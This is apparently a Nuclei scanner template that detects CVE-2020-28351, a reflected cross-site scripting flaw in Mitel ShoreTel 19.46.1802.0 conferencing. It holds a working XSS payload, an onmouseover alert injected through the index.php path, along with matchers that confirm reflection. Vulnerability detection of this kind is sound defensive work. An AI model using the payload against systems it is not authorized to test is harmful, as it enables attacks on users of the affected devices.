id: CVE-2020-28351

info:
  name: ShoreTel 19.46.1802.0 XSS
  author: pikpikcu
  severity: medium
  description: conferencing component on Mitel ShoreTel 19.46.1802.0 devices could allow an unauthenticated attacker to conduct a reflected cross-site scripting (XSS) attack (via the PATH_INFO to index.php) due to insufficient validation for the time_zone object in the HOME_MEETING& page
  reference:
    - https://packetstormsecurity.com/files/159987/ShoreTel-Conferencing-19.46.1802.0-Cross-Site-Scripting.html
    - https://nvd.nist.gov/vuln/detail/CVE-2020-28351
  tags: cves,cve2020,shoretel,xss

requests:
  - method: GET
    path:
      - "{{BaseURL}}/index.php/%22%20onmouseover=alert(document.domain)%20?page=HOME"
    headers:
      Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:

      - type: word
        words:
          - 'onmouseover=alert(document.domain)'
        part: body

      - type: word
        words:
          - 'Content-Type: text/html'
        part: header
